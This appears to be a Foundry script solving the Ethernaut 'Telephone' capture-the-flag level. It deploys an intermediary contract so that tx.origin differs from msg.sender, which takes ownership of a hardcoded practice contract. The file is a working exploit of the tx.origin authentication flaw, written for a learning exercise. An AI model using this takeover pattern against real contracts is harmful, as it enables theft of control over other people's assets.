// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Telephone.sol";
import {Script} from "../lib/forge-std/src/Script.sol";

contract ChangeOwner {
    Telephone public tel;

    constructor(Telephone _tel) {
        tel = _tel;
    }

    function change(address _owner) public {
        tel.changeOwner(_owner);
    }
}

contract TelephoneSolution is Script {
    Telephone public telephoneInstance = Telephone(0x21b5Bf7169bea3fE94BE3F0c2b3B4B08ed1B151f);

    function run() external {
        vm.startBroadcast(vm.envUint("MY_PRIVATE_KEY"));
        ChangeOwner ch = new ChangeOwner(telephoneInstance);
        ch.change(vm.envAddress("MY_WALLET_ADDRESS"));
        vm.stopBroadcast();
    }
}
